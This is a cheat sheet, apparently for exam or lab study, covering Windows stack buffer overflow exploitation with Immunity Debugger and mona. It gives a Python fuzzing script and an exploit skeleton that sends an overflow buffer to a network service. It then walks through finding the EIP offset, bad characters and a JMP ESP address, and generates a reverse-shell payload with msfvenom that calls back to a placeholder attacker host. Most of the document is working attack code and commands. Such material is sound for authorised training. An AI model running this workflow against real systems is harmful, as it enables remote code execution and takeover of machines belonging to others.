# **Buff Overflow Cheat Sheet**

* Immunity Debugger
* Mona Command

## **Mona Configuration**

> Mona make Buff Overflow ez

> Set the working folder for mona

    !mona config -set workingfolder c:\mona\%p

## **Fuzzing** 

> Identify the Crashed Point

> Make a note of the largest number of bytes that were sent.

> Fuzzing Script
 
```python
import socket, time, sys

ip = "{ IP ADDRESS }"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("{ COMMAND } " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

## **Crash Replication & Controlling EIP**

> Exploit Script

```python
import socket

ip = "{ IP ADDRESS }"
port = 1337

prefix = "{ COMMAND } "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

> Create a cyclic pattern

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l { length 400 bytes longer than the crashed point }

> Copy the output and place it into the payload variable of the exploit.py script. | **re-open the software and excute again**

    !mona findmsp -distance { length 400 bytes longer than the crashed point }

> The offset will display

    EIP contains normal pattern : ... (offset XXXX)

> Modify the exploit Again
* offset = XXXX
* retn = "BBBB"
* payload = "" ### **set it to empty**

> restart the software and exploit again\
>The EIP register should now be overwritten with the 4 B's (e.g. **42424242**)

## Finding Bad Characters

> Generate a bytearray using mona, and exclude the null byte (\x00) by default.

    !mona bytearray -b "\x00"

> Generate a string of bad chars that is identical to the bytearray.

```python
from __future__ import print_function

listRem = "\\x00".split("\\x")
for x in range(1, 256):
    if "{:02x}".format(x) not in listRem:
        print("\\x" + "{:02x}".format(x), end='')

print()
```

> Update your exploit.py script and set the payload variable to the string of bad chars the script generates.

> Compare the Bad Characters and make notes 

    !mona compare -f C:\mona\oscp\bytearray.bin -a { ESP Register Point }

> **Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.** 

    eg: 00 01 06 07 a0 a1
    the positive bad characters will be: 00 06 a0

> Using the New Bad Characters to Generate A New Bad Characters String and place it as Payload | to capture the Bad Characters Again
    
    Keep Analyze the Bad Characters untile the result only showing 00 01 or the same Bad Characters that we used to generate the string paylooad 

## **Finding a Jump Point**

> To Capture a Jump Point

    !mona jmp -r esp -cpb "\x00"

> The results should display in the "Log data" window with several Jump Point | setting the "retn" variable to the address, written backwards 

    eg: 62501203 
    Change it to: \x03\x12\x50\x62

## **Generate Payload**

> put all the identified Bad Characters follow by the \x00

    msfvenom -p windows/shell_reverse_tcp LHOST= { IP ADDRESS } LPORT= { PORT } EXITFUNC=thread -b "\x00" -f py

> pates the payload into our exploit

## **Prepend NOPs**

> Setting the space in memory for the payload to unpack itself.

    padding = "\x90" * 16

## **Exploit!**

> Run the listener and Exploit
